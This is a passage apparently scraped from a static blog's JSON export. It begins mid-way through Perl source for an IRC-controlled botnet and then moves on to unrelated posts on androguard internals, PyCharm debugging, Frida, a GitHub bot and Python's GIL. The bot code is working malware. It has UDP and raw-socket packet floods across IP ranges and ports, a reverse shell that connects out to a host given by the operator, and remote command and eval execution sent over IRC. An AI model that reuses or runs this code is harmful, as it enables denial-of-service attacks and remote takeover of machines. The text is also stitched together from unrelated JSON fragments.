socket(Tr0x, PF_INET, SOCK_DGRAM, 17); my $faixaip=&quot;$1&quot;; my $porta = &quot;$2&quot;; my $tempo = &quot;$3&quot;; my $pacote; my $pacotes; my $fim = time + $tempo; my $pacota = 1; my $alvo; while ($pacota == &quot;1&quot;) &#123; $pacota = 0 if ((time &gt;= $fim) &amp;&amp; ($tempo != &quot;0&quot;)); for (my $faixa = 1; $faixa &lt;= 255; $faixa++) &#123; $alvo = inet_aton(&quot;$faixaip.$faixa&quot;); $pacote=$rand x $rand x $rand; $porta = int(rand 65000) +1 if ($porta == &quot;0&quot;); send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == &quot;1&quot;); if ($faixa &gt;= 255) &#123; $faixa = 1; &#125; &#125; &#125; if ($estatisticas) &#123; sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo&quot;.&quot;s&quot;); sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese&quot;); sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :\\002Alvo dos Pacotes\\002: $alvo&quot;); &#125; &#125; elsif ($funcarg =~ /^conback\\s+(.*)\\s+(\\d+)/) &#123; my $host = &quot;$1&quot;; my $porta = &quot;$2&quot;; my $proto = getprotobyname(&#x27;tcp&#x27;); my $iaddr = inet_aton($host); my $paddr = sockaddr_in($porta, $iaddr); my $shell = &quot;/bin/sh -i&quot;; if ($^O eq &quot;MSWin32&quot;) &#123; $shell = &quot;cmd.exe&quot;; &#125; socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die &quot;socket: $!&quot;; connect(SOCKET, $paddr) or die &quot;connect: $!&quot;; open(STDIN, &quot;&gt;&amp;SOCKET&quot;); open(STDOUT, &quot;&gt;&amp;SOCKET&quot;); open(STDERR, &quot;&gt;&amp;SOCKET&quot;); system(&quot;$shell&quot;); close(STDIN); close(STDOUT); close(STDERR); if ($estatisticas) &#123; sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :\\002Conectando-se em\\002: $host:$porta&quot;); &#125; &#125; elsif ($funcarg =~ /^oldpack\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) &#123; return unless $pacotes; my ($dtime, %pacotes) = attacker(&quot;$1&quot;, &quot;$2&quot;, &quot;$3&quot;); $dtime = 1 if $dtime == 0; my %bytes; $bytes&#123;igmp&#125; = $2 * $pacotes&#123;igmp&#125;; $bytes&#123;icmp&#125; = $2 * $pacotes&#123;icmp&#125;; $bytes&#123;o&#125; = $2 * $pacotes&#123;o&#125;; $bytes&#123;udp&#125; = $2 * $pacotes&#123;udp&#125;; $bytes&#123;tcp&#125; = $2 * $pacotes&#123;tcp&#125;; unless ($estatisticas) &#123; sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :\\002 - Status -\\002&quot;); sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :\\002Timp\\002: $dtime&quot;.&quot;secunde.&quot;); sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :\\002Total packet\\002: &quot;.($pacotes&#123;udp&#125; + $pacotes&#123;igmp&#125; + $pacotes&#123;icmp&#125; + $pacotes&#123;o&#125;)); sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :\\002Total bytes\\002: &quot;.($bytes&#123;icmp&#125; + $bytes &#123;igmp&#125; + $bytes&#123;udp&#125; + $bytes&#123;o&#125;)); sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :\\002Flood\\002: &quot;.int((($bytes&#123;icmp&#125;+$bytes&#123;igmp&#125;+$bytes&#123;udp&#125; + $bytes&#123;o&#125;)/1024)/$dtime).&quot; kbps&quot;); &#125; &#125; exit; &#125; &#125;&#125;sub ircase &#123; my ($kem, $printl, $case) = @_; if ($case =~ /^join (.*)/) &#123; j(&quot;$1&quot;); &#125; elsif ($case =~ /^part (.*)/) &#123; p(&quot;$1&quot;); &#125; elsif ($case =~ /^rejoin\\s+(.*)/) &#123; my $chan = $1; if ($chan =~ /^(\\d+) (.*)/) &#123; for (my $ca = 1; $ca &lt;= $1; $ca++ ) &#123; p(&quot;$2&quot;); j(&quot;$2&quot;); &#125; &#125; else &#123; p(&quot;$chan&quot;); j(&quot;$chan&quot;); &#125; &#125; elsif ($case =~ /^op/) &#123; op(&quot;$printl&quot;, &quot;$kem&quot;) if $case eq &quot;op&quot;; my $oarg = substr($case, 3); op(&quot;$1&quot;, &quot;$2&quot;) if ($oarg =~ /(\\S+)\\s+(\\S+)/); &#125; elsif ($case =~ /^deop/) &#123; deop(&quot;$printl&quot;, &quot;$kem&quot;) if $case eq &quot;deop&quot;; my $oarg = substr($case, 5); deop(&quot;$1&quot;, &quot;$2&quot;) if ($oarg =~ /(\\S+)\\s+(\\S+)/); &#125; elsif ($case =~ /^voice/) &#123; voice(&quot;$printl&quot;, &quot;$kem&quot;) if $case eq &quot;voice&quot;; $oarg = substr($case, 6); voice(&quot;$1&quot;, &quot;$2&quot;) if ($oarg =~ /(\\S+)\\s+(\\S+)/); &#125; elsif ($case =~ /^devoice/) &#123; devoice(&quot;$printl&quot;, &quot;$kem&quot;) if $case eq &quot;devoice&quot;; $oarg = substr($case, 8); devoice(&quot;$1&quot;, &quot;$2&quot;) if ($oarg =~ /(\\S+)\\s+(\\S+)/); &#125; elsif ($case =~ /^msg\\s+(\\S+) (.*)/) &#123; msg(&quot;$1&quot;, &quot;$2&quot;); &#125; elsif ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) &#123; for (my $cf = 1; $cf &lt;= $1; $cf++) &#123; msg(&quot;$2&quot;, &quot;$3&quot;); &#125; &#125; elsif ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) &#123; for (my $cf = 1; $cf &lt;= $1; $cf++) &#123; ctcp(&quot;$2&quot;, &quot;$3&quot;); &#125; &#125; elsif ($case =~ /^ctcp\\s+(\\S+) (.*)/) &#123; ctcp(&quot;$1&quot;, &quot;$2&quot;); &#125; elsif ($case =~ /^invite\\s+(\\S+) (.*)/) &#123; invite(&quot;$1&quot;, &quot;$2&quot;); &#125; elsif ($case =~ /^nick (.*)/) &#123; nick(&quot;$1&quot;); &#125; elsif ($case =~ /^conecta\\s+(\\S+)\\s+(\\S+)/) &#123; conectar(&quot;$2&quot;, &quot;$1&quot;, 6667); &#125; elsif ($case =~ /^send\\s+(\\S+)\\s+(\\S+)/) &#123; DCC::SEND(&quot;$1&quot;, &quot;$2&quot;); &#125; elsif ($case =~ /^raw (.*)/) &#123; sendraw(&quot;$1&quot;); &#125; elsif ($case =~ /^eval (.*)/) &#123; eval &quot;$1&quot;; &#125; elsif ($case =~ /^entra\\s+(\\S+)\\s+(\\d+)/) &#123; sleep int(rand($2)); j(&quot;$1&quot;); &#125; elsif ($case =~ /^sai\\s+(\\S+)\\s+(\\d+)/) &#123; sleep int(rand($2)); p(&quot;$1&quot;); &#125; elsif ($case =~ /^sair/) &#123; quit(); &#125; elsif ($case =~ /^novonick/) &#123; my $novonick = getnick(); nick(&quot;$novonick&quot;); &#125; elsif ($case =~ /^estatisticas (.*)/) &#123; if ($1 eq &quot;on&quot;) &#123; $estatisticas = 1; msg(&quot;$printl&quot;, &quot;Estat.sticas ativadas!&quot;); &#125; elsif ($1 eq &quot;off&quot;) &#123; $estatisticas = 0; msg(&quot;$printl&quot;, &quot;Estat.sticas desativadas!&quot;); &#125; &#125; elsif ($case =~ /^pacotes (.*)/) &#123; if ($1 eq &quot;on&quot;) &#123; $pacotes = 1; msg(&quot;$printl&quot;, &quot;Pacotes ativados!&quot;) if ($estatisticas == &quot;1&quot;); &#125; elsif ($1 eq &quot;off&quot;) &#123; $pacotes = 0; msg(&quot;$printl&quot;, &quot;Pacotes desativados!&quot;) if ($estatisticas == &quot;1&quot;); &#125; &#125;&#125;sub shell &#123; return unless $acessoshell; my $printl=$_[0]; my $comando=$_[1]; if ($comando =~ /cd (.*)/) &#123; chdir(&quot;$1&quot;) || msg(&quot;$printl&quot;, &quot;Diret.rio inexistente!&quot;); return; &#125; elsif ($pid = fork) &#123; waitpid($pid, 0); &#125; else &#123; if (fork) &#123; exit; &#125; else &#123; my @resp=`$comando 2&gt;&amp;1 3&gt;&amp;1`; my $c=0; foreach my $linha (@resp) &#123; $c++; chop $linha; sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :$linha&quot;); if ($c &gt;= &quot;$linas_max&quot;) &#123; $c=0; sleep $sleep; &#125; &#125; exit; &#125; &#125;&#125;sub attacker &#123; my $iaddr = inet_aton($_[0]); my $msg = &#x27;B&#x27; x $_[1]; my $ftime = $_[2]; my $cp = 0; my (%pacotes); $pacotes&#123;icmp&#125; = $pacotes&#123;igmp&#125; = $pacotes&#123;udp&#125; = $pacotes&#123;o&#125; = $pacotes&#123;tcp&#125; = 0; socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++; socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++; socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++; socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++; return(undef) if $cp == 4; my $itime = time; my ($cur_time); while ( 1 ) &#123; for (my $porta = 1; $porta &lt;= 65535; $porta++) &#123; $cur_time = time - $itime; last if $cur_time &gt;= $ftime; send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes&#123;igmp&#125;++ if ($pacotes == 1); send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes&#123;udp&#125;++ if ($pacotes == 1); send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes&#123;icmp&#125;++ if ($pacotes == 1); send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes&#123;tcp&#125;++ if ($pacotes == 1); for (my $pc = 3; $pc &lt;= 255;$pc++) &#123; next if $pc == 6; $cur_time = time - $itime; last if $cur_time &gt;= $ftime; socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next; send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes&#123;o&#125;++ if ($pacotes == 1); &#125; &#125; last if $cur_time &gt;= $ftime; &#125; return($cur_time, %pacotes);&#125;sub action &#123; return unless $#_ == 1; sendraw(&quot;PRIVMSG $_[0] :\\001ACTION $_[1]\\001&quot;);&#125;sub ctcp &#123; return unless $#_ == 1; sendraw(&quot;PRIVMSG $_[0] :\\001$_[1]\\001&quot;);&#125;sub msg &#123; return unless $#_ == 1; sendraw(&quot;PRIVMSG $_[0] :$_[1]&quot;);&#125;sub notice &#123; return unless $#_ == 1; sendraw(&quot;NOTICE $_[0] :$_[1]&quot;);&#125;sub op &#123; return unless $#_ == 1; sendraw(&quot;MODE $_[0] +o $_[1]&quot;);&#125;sub deop &#123; return unless $#_ == 1; sendraw(&quot;MODE $_[0] -o $_[1]&quot;);&#125;sub hop &#123; return unless $#_ == 1; sendraw(&quot;MODE $_[0] +h $_[1]&quot;);&#125;sub dehop &#123; return unless $#_ == 1; sendraw(&quot;MODE $_[0] +h $_[1]&quot;);&#125;sub voice &#123; return unless $#_ == 1; sendraw(&quot;MODE $_[0] +v $_[1]&quot;);&#125;sub devoice &#123; return unless $#_ == 1; sendraw(&quot;MODE $_[0] -v $_[1]&quot;);&#125;sub ban &#123; return unless $#_ == 1; sendraw(&quot;MODE $_[0] +b $_[1]&quot;);&#125;sub unban &#123; return unless $#_ == 1; sendraw(&quot;MODE $_[0] -b $_[1]&quot;);&#125;sub kick &#123; return unless $#_ == 1; sendraw(&quot;KICK $_[0] $_[1] :$_[2]&quot;);&#125;sub modo &#123; return unless $#_ == 0; sendraw(&quot;MODE $_[0] $_[1]&quot;);&#125;sub mode &#123; modo(@_); &#125;sub j &#123; &amp;join(@_); &#125;sub join &#123; return unless $#_ == 0; sendraw(&quot;JOIN $_[0]&quot;);&#125;sub p &#123; part(@_); &#125;sub part &#123;sendraw(&quot;PART $_[0]&quot;);&#125;sub nick &#123; return unless $#_ == 0; sendraw(&quot;NICK $_[0]&quot;);&#125;sub invite &#123; return unless $#_ == 1; sendraw(&quot;INVITE $_[1] $_[0]&quot;);&#125;sub topico &#123; return unless $#_ == 1; sendraw(&quot;TOPIC $_[0] $_[1]&quot;);&#125;sub topic &#123; topico(@_); &#125;sub whois &#123; return unless $#_ == 0; sendraw(&quot;WHOIS $_[0]&quot;);&#125;sub who &#123; return unless $#_ == 0; sendraw(&quot;WHO $_[0]&quot;);&#125;sub names &#123; return unless $#_ == 0; sendraw(&quot;NAMES $_[0]&quot;);&#125;sub away &#123; sendraw(&quot;AWAY $_[0]&quot;);&#125;sub back &#123; away(); &#125;sub quit &#123; sendraw(&quot;QUIT :$_[0]&quot;); exit;&#125;package DCC;sub connections &#123; my @ready = $dcc_sel-&gt;can_read(1); foreach my $fh (@ready) &#123; my $dcctipo = $DCC&#123;$fh&#125;&#123;tipo&#125;; my $arquivo = $DCC&#123;$fh&#125;&#123;arquivo&#125;; my $bytes = $DCC&#123;$fh&#125;&#123;bytes&#125;; my $cur_byte = $DCC&#123;$fh&#125;&#123;curbyte&#125;; my $nick = $DCC&#123;$fh&#125;&#123;nick&#125;; my $msg; my $nread = sysread($fh, $msg, 10240); if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) &#123; $DCC&#123;$fh&#125;&#123;status&#125; = &quot;Cancelado&quot;; $DCC&#123;$fh&#125;&#123;ftime&#125; = time; $dcc_sel-&gt;remove($fh); $fh-&gt;close; next; &#125; if ($dcctipo eq &quot;get&quot;) &#123; $DCC&#123;$fh&#125;&#123;curbyte&#125; += length($msg); my $cur_byte = $DCC&#123;$fh&#125;&#123;curbyte&#125;; open(FILE, &quot;&gt;&gt; $arquivo&quot;); print FILE &quot;$msg&quot; if ($cur_byte &lt;= $bytes); close(FILE); my $packbyte = pack(&quot;N&quot;, $cur_byte); print $fh &quot;$packbyte&quot;; if ($bytes == $cur_byte) &#123; $dcc_sel-&gt;remove($fh); $fh-&gt;close; $DCC&#123;$fh&#125;&#123;status&#125; = &quot;Recebido&quot;; $DCC&#123;$fh&#125;&#123;ftime&#125; = time; next; &#125; &#125; elsif ($dcctipo eq &quot;send&quot;) &#123; my $send = $fh-&gt;accept; $send-&gt;autoflush(1); $dcc_sel-&gt;add($send); $dcc_sel-&gt;remove($fh); $DCC&#123;$send&#125;&#123;tipo&#125; = &#x27;sendcon&#x27;; $DCC&#123;$send&#125;&#123;itime&#125; = time; $DCC&#123;$send&#125;&#123;nick&#125; = $nick; $DCC&#123;$send&#125;&#123;bytes&#125; = $bytes; $DCC&#123;$send&#125;&#123;curbyte&#125; = 0; $DCC&#123;$send&#125;&#123;arquivo&#125; = $arquivo; $DCC&#123;$send&#125;&#123;ip&#125; = $send-&gt;peerhost; $DCC&#123;$send&#125;&#123;porta&#125; = $send-&gt;peerport; $DCC&#123;$send&#125;&#123;status&#125; = &quot;Enviando&quot;; open(FILE, &quot;&lt; $arquivo&quot;); my $fbytes; read(FILE, $fbytes, 1024); print $send &quot;$fbytes&quot;; close FILE; &#125; elsif ($dcctipo eq &#x27;sendcon&#x27;) &#123; my $bytes_sended = unpack(&quot;N&quot;, $msg); $DCC&#123;$fh&#125;&#123;curbyte&#125; = $bytes_sended; if ($bytes_sended == $bytes) &#123; $fh-&gt;close; $dcc_sel-&gt;remove($fh); $DCC&#123;$fh&#125;&#123;status&#125; = &quot;Enviado&quot;; $DCC&#123;$fh&#125;&#123;ftime&#125; = time; next; &#125; open(SENDFILE, &quot;&lt; $arquivo&quot;); seek(SENDFILE, $bytes_sended, 0); my $send_bytes; read(SENDFILE, $send_bytes, 1024); print $fh &quot;$send_bytes&quot;; close(SENDFILE); &#125; &#125;&#125;sub SEND &#123; my ($nick, $arquivo) = @_; unless (-r &quot;$arquivo&quot;) &#123; return(0); &#125; my $dccark = $arquivo; $dccark =~ s/[.*\\/](\\S+)/$1/; my $meuip = $::irc_servers&#123;&quot;$::IRC_cur_socket&quot;&#125;&#123;&#x27;meuip&#x27;&#125;; my $longip = unpack(&quot;N&quot;,inet_aton($meuip)); my @filestat = stat($arquivo); my $size_total=$filestat[7]; if ($size_total == 0) &#123; return(0); &#125; my ($porta, $sendsock); do &#123; $porta = int rand(64511); $porta += 1024; $sendsock = IO::Socket::INET-&gt;new(Listen=&gt;1, LocalPort =&gt;$porta, Proto =&gt; &#x27;tcp&#x27;) and $dcc_sel-&gt;add($sendsock); &#125; until $sendsock; $DCC&#123;$sendsock&#125;&#123;tipo&#125; = &#x27;send&#x27;; $DCC&#123;$sendsock&#125;&#123;nick&#125; = $nick; $DCC&#123;$sendsock&#125;&#123;bytes&#125; = $size_total; $DCC&#123;$sendsock&#125;&#123;arquivo&#125; = $arquivo; &amp;::ctcp(&quot;$nick&quot;, &quot;DCC SEND $dccark $longip $porta $size_total&quot;);&#125;sub GET &#123; my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_; return(0) if (-e &quot;$arquivo&quot;); if (open(FILE, &quot;&gt; $arquivo&quot;)) &#123; close FILE; &#125; else &#123; return(0); &#125; my $dccip=fixaddr($dcclongip); return(0) if ($dccporta &lt; 1024 or not defined $dccip or $bytes &lt; 1); my $dccsock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;$dccip, PeerPort=&gt;$dccporta, Timeout=&gt;15) or return (0); $dccsock-&gt;autoflush(1); $dcc_sel-&gt;add($dccsock); $DCC&#123;$dccsock&#125;&#123;tipo&#125; = &#x27;get&#x27;; $DCC&#123;$dccsock&#125;&#123;itime&#125; = time; $DCC&#123;$dccsock&#125;&#123;nick&#125; = $nick; $DCC&#123;$dccsock&#125;&#123;bytes&#125; = $bytes; $DCC&#123;$dccsock&#125;&#123;curbyte&#125; = 0; $DCC&#123;$dccsock&#125;&#123;arquivo&#125; = $arquivo; $DCC&#123;$dccsock&#125;&#123;ip&#125; = $dccip; $DCC&#123;$dccsock&#125;&#123;porta&#125; = $dccporta; $DCC&#123;$dccsock&#125;&#123;status&#125; = &quot;Recebendo&quot;;&#125;sub Status &#123; my $socket = shift; my $sock_tipo = $DCC&#123;$socket&#125;&#123;tipo&#125;; unless (lc($sock_tipo) eq &quot;chat&quot;) &#123; my $nick = $DCC&#123;$socket&#125;&#123;nick&#125;; my $arquivo = $DCC&#123;$socket&#125;&#123;arquivo&#125;; my $itime = $DCC&#123;$socket&#125;&#123;itime&#125;; my $ftime = time; my $status = $DCC&#123;$socket&#125;&#123;status&#125;; $ftime = $DCC&#123;$socket&#125;&#123;ftime&#125; if defined($DCC&#123;$socket&#125;&#123;ftime&#125;); my $d_time = $ftime-$itime; my $cur_byte = $DCC&#123;$socket&#125;&#123;curbyte&#125;; my $bytes_total = $DCC&#123;$socket&#125;&#123;bytes&#125;; my $rate = 0; $rate = ($cur_byte/1024)/$d_time if $cur_byte &gt; 0; my $porcen = ($cur_byte*100)/$bytes_total; my ($r_duv, $p_duv); if ($rate =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) &#123; $r_duv = $3; $r_duv++ if $4 &gt;= 5; $rate = &quot;$1\\.$2&quot;.&quot;$r_duv&quot;; &#125; if ($porcen =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) &#123; $p_duv = $3; $p_duv++ if $4 &gt;= 5; $porcen = &quot;$1\\.$2&quot;.&quot;$p_duv&quot;; &#125; return(&quot;$sock_tipo&quot;,&quot;$status&quot;,&quot;$nick&quot;,&quot;$arquivo&quot;,&quot;$bytes_total&quot;, &quot;$cur_byte&quot;,&quot;$d_time&quot;, &quot;$rate&quot;, &quot;$porcen&quot;); &#125; return(0);&#125;sub fixaddr &#123; my ($address) = @_; chomp $address; if ($address =~ /^\\d+$/) &#123; return inet_ntoa(pack &quot;N&quot;, $address); &#125; elsif ($address =~ /^[12]?\\d&#123;1,2&#125;\\.[12]?\\d&#123;1,2&#125;\\.[12]?\\d&#123;1,2&#125;\\.[12]?\\d&#123;1,2&#125;$/) &#123; return $address; &#125; elsif ($address =~ tr/a-zA-Z//) &#123; return inet_ntoa(((gethostbyname($address))[4])[0]); &#125; else &#123; return; &#125;&#125;","raw":null,"content":null,"categories":[],"tags":[]},{"title":"androguard code tracing","slug":"androguard-code-tracing","date":"2022-04-22T07:12:30.000Z","updated":"2025-06-30T10:40:10.169Z","comments":true,"path":"2022/04/22/androguard-code-tracing/","link":"","permalink":"https://krnick.github.io/2022/04/22/androguard-code-tracing/","excerpt":"","text":"androguard code traceandroguard UsageThis is the most common way how we use androguard. 1234from androguard.misc import AnalyzeAPKapk, dalvikvmformat, analysis = AnalyzeAPK(apk_filepath) Entry PointLet’ us start from the AnalyzeAPK. AnalyzeAPK(androguard&#x2F;misc.py)Responsible for the generation of the three objects below. apk dalvikvmformat analysis apk objectYou can get information like the package name, permissions from the AndroidManifest.xml, which generated by class APK(). androguard&#x2F;misc.py 1a = APK(_file, raw=raw) androguard&#x2F;core&#x2F;bytecodes&#x2F;apk.py 1class APK(): It will parse files in APK through Python zipfile module. This APK object is responsible for decompressing “AndroidManifest.xml” in APK. Implementation function: androguard&#x2F;core&#x2F;bytecodes&#x2F;apk.py 12if not skip_analysis: self._apk_analysis() 1def _apk_analysis(self) ASRC class for decoding resources.arsc AXML class for decoding AndroidManifest.xml and all other XML files Inside this method, it will get the information below. AXML Permissions Each tag in xml The following video records the process of making an apk object. dalvikvmformat ObjectThe DalvikVMFormat corresponds to the DEX file found inside the APK file. You can get classes, methods or strings from the DEX file. androguard&#x2F;misc.py 1234567891011d = []dx = Analysis()for dex in a.get_all_dex(): df = DalvikVMFormat(dex, using_api=a.get_target_sdk_version()) dx.add(df) d.append(df) df.set_decompiler(decompiler.DecompilerDAD(d, dx))dx.create_xref()return a, d, dx Analysis ObjectThe Analysis object should be used instead, as it contains special classes, which link information about the classes.dex and can even handle many DEX files at once. The Analysis contains a lot of information about (multiple) DalvikVMFormat objects Features are for example XREFs between Classes, Methods, Fields, and Strings. Yet another part is the creation of BasicBlocks, which is important in the usage of the Androguard Decompiler. quark&#x2F;androguard&#x2F;misc.py 1dx = Analysis() androguard&#x2F;core&#x2F;analysis&#x2F;analysis.py 1class Analysis: Find information inside DEX file: DalvikVMFormat objects classname string methods EXTERNAL method It is called the native API. XREFs Classes, Methods, Fields, and Strings. Initialize d and dx. Prepare for the following code below. 1234567for dex in a.get_all_dex(): df = DalvikVMFormat(dex, using_api=a.get_target_sdk_version()) dx.add(df) d.append(df) df.set_decompiler(decompiler.DecompilerDAD(d, dx))dx.create_xref() Param dex will return the raw data of all classes dex files. 1234get_all_dex() dexre = re.compile(r&quot;classes(\\d*).dex&quot;) return filter(lambda x: dexre.match(x), self.get_files()) get_all_dex get all the file names in the zip, and get all the class.dex files through regular expressions, it may be classes.dex or classes[0-9]+.dex. quark&#x2F;androguard&#x2F;misc.py 1df = DalvikVMFormat(dex, using_api=a.get_target_sdk_version()) DalvikVMFormat takes the binary content of each DEX as a parameter, and initializes the class DalvikVMFormat according to the API version used. androguard&#x2F;core&#x2F;bytecodes&#x2F;dvm.py 1234567891011121314151617181920212223242526272829303132class DalvikVMFormat(bytecode.BuffHandle): &quot;&quot;&quot; This class can parse a classes.dex file of an Android application (APK). :param buff: a string which represents the classes.dex file :param decompiler: associate a decompiler object to display the java source code :type buff: bytes :type decompiler: object example:: d = DalvikVMFormat( read(&quot;classes.dex&quot;) ) &quot;&quot;&quot; def __init__(self, buff, decompiler=None, config=None, using_api=None): # to allow to pass apk object ==&gt; we do not need to pass additionally target version if isinstance(buff, APK): self.api_version = buff.get_target_sdk_version() buff = buff.get_dex() # getting dex from APK file elif using_api: self.api_version = using_api else: self.api_version = CONF[&quot;DEFAULT_API&quot;] super().__init__(buff) self._flush() self.CM = ClassManager(self) self.CM.set_decompiler(decompiler) self._preload(buff) self._load(buff) This class can parse a classes.dex file of an Android application (APK). androguard&#x2F;core&#x2F;bytecodes&#x2F;dvm.py ClassManager This class is used to access to all elements (strings, type, proto …) of the dex format based on their offset or index. set_decompiler Setting the disassembled tool used for disassembling an apk such as Jadx or DAD. Last one: androguard&#x2F;core&#x2F;analysis&#x2F;analysis.py 1dx.create_xref() Create Class, Method, String, and Field crossreferences for all classes in the Analysis. If you are using multiple DEX files, this function must be called when all DEX files are added. If you call the function after every DEX file, it will only work for the first time. This function is already called in the object Analysis, so we don’t need to call it again. The following video records the process of making an DalvikVMFormat object. ImportantOnly when calling the get_source_method function in DecompilerDAD is it considered that disassemble an apk. In fact, we only use the information in the Dex file and the method of cross-references, as well as the information about android permission. We did not do the disassemble an apk.","raw":null,"content":null,"categories":[],"tags":[]},{"title":"PyCharm Debug","slug":"PyCharm-Debug","date":"2022-04-22T07:11:48.000Z","updated":"2025-06-30T10:40:10.169Z","comments":true,"path":"2022/04/22/PyCharm-Debug/","link":"","permalink":"https://krnick.github.io/2022/04/22/PyCharm-Debug/","excerpt":"","text":"PyCharm Debug step over 單步執行 在函數內遇到子函數不會執行 steop into 單步執行 在函數內遇到函數會跳進去 step into my code 遇到子函數就進入並且繼續單步執行，不會進入到原始碼中 step out 跳出一個函數 如果進到一個函數內，不想看了，即可按這個 以上四個功能，就是最常用的功能，一般操作步驟就是，設置好斷點，debug運行，然後F8 單步調試，遇到想進入的函數F7 進去，想出來在shift + F8，跳過不想看的地方，直接設置下一個斷點，然後F9 過去。","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Frida tips","slug":"Frida-tips","date":"2022-04-22T07:07:07.000Z","updated":"2025-06-30T10:40:10.168Z","comments":true,"path":"2022/04/22/Frida-tips/","link":"","permalink":"https://krnick.github.io/2022/04/22/Frida-tips/","excerpt":"","text":"Frida tips for dynamically calling Java class methods in AndroidAndroid example code snippet1234567891011121314151617181920212223242526272829303132package com.example.test;import android.os.Bundle;import android.util.Log;import androidx.appcompat.app.AppCompatActivity;public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); &#125;&#125;class Foo &#123; public int sum(int num1, int num2) &#123; Log.i(&quot;Foo&quot;, &quot;Called by frida&quot;); Log.i(&quot;Foo&quot;, String.valueOf(num1 + num2)); return num1 + num2; &#125;&#125; Frida Javascript1234567891011function main()&#123; Java.perform(function()&#123; console.log(&quot;Android class method invocation&quot;); var instance = Java.use(&quot;com.example.test.Foo&quot;).$new(); console.log(instance.sum(9,9)); console.log(instance.sum(3,6)); console.log(instance.sum(1,2)); &#125;)&#125;main(); Command-line1frida -U -f com.example.test -l test.js --no-pause","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Github Bot","slug":"Github-Bot","date":"2022-04-22T06:56:57.000Z","updated":"2025-06-30T10:40:10.168Z","comments":true,"path":"2022/04/22/Github-Bot/","link":"","permalink":"https://krnick.github.io/2022/04/22/Github-Bot/","excerpt":"","text":"Github BotRegister Heroku Local setting1pip install gidgethub get your Github Token In Unix &#x2F; Mac OS: 1export GH_AUTH=your token Local test1234567891011121314151617181920212223242526import asyncioimport osimport aiohttpfrom gidgethub.aiohttp import GitHubAPIasync def main(): async with aiohttp.ClientSession() as session: gh = GitHubAPI(session, &quot;krnick&quot;, oauth_token=os.getenv(&quot;GH_AUTH&quot;)) # 開啟新的 issue await gh.post(&#x27;/repos/krnick/Github-Bot/issues&#x27;, data=&#123; &#x27;title&#x27;: &#x27;Hello Nick&#x27;, &#x27;body&#x27;: &#x27;This is github bot from JunWei&#x27;, &#125;) # 關閉 issue await gh.patch(&#x27;/repos/krnick/Github-Bot/issues/1&#x27;, data=&#123;&#x27;state&#x27;: &#x27;closed&#x27;&#125;, )loop = asyncio.get_event_loop()loop.run_until_complete(main()) deploycreate a new APPauthconnect Github Creat a new webhook at the repo you want to build Set your key at Heroku GH_AUTH GH_SECRET typo check repos example Refhttps://github-bot-tutorial.readthedocs.io/en/latest/index.html","raw":null,"content":null,"categories":[],"tags":[]},{"title":"GIL, the magic lock inside the CPython","slug":"GIL","date":"2021-11-24T02:42:53.000Z","updated":"2025-06-30T10:40:10.168Z","comments":true,"path":"2021/11/24/GIL/","link":"","permalink":"https://krnick.github.io/2021/11/24/GIL/","excerpt":"","text":"GIL, the magic lock inside the CPythonWhat makes Python different from other languages, the GIL(Global Interpreter Lock) must be the cherry on top of the cake. Simply put, the GIL is a lock inside the CPython interpreter to prevent the reference counting of an object from becoming a race condition at the bytecode level. The reference counting would look like this: 12345import sysa = [1,2]b = aprint(sys.getrefcount(a)) # 3 Since Python garbage collection uses reference counting to check unused objects at runtime, each object in the runtime will use a number count to check whether it is used by other objects. If not, then CPython will delete the object to free the memory to avoid memory leaks. DisadvantagesThe purpose of using the GIL is to deal with the issue of reference counting. However, due to this lock, there are some disadvantages related to it. For example: Threads in Python become useless, especially when dealing with CPU-bound tasks. Moreover, it slows down even lower than a single thread. When using multi-threads or multi-process, even if there is a GIL, the locking mechanism is still needed. Comparison of single-process, multi-thread, multi-process, and process pool.If we conduct a simple test to write our program using the above four methods to compare the speed, then we can see the result by order will like below: Multi-process-pool &gt; Multi-process &gt; Single process &gt; Multi-thread The reason why multithreading is the last one is because of the GIL, even if there are many threads, tasks in Python can still only run on a single thread. In addition, context switching will also slow down the program and cause more waste of resources. SolutionThere are many ways to overcome this obstacle. Here are some solutions to bypass the GIL: Use another interpreter to execute Python, such as PyPy, Jython. Use multi-processes with pools to perform CPU-bound tasks. Use C extensions to write the key block that you really care about. So now, let’s deep dive into the third solution since the first two are easy to figure out. C extensionsIf we want to write the C extension, we can use the ctypes module to load our c program dynamically. For example, if we want to call a function say_hello look like below: 1234567#include&lt;stdio.h&gt;void say_hello() &#123; printf(&quot;This is a function call from C Language\\n&quot;);&#125; Then we use the below command to compile it 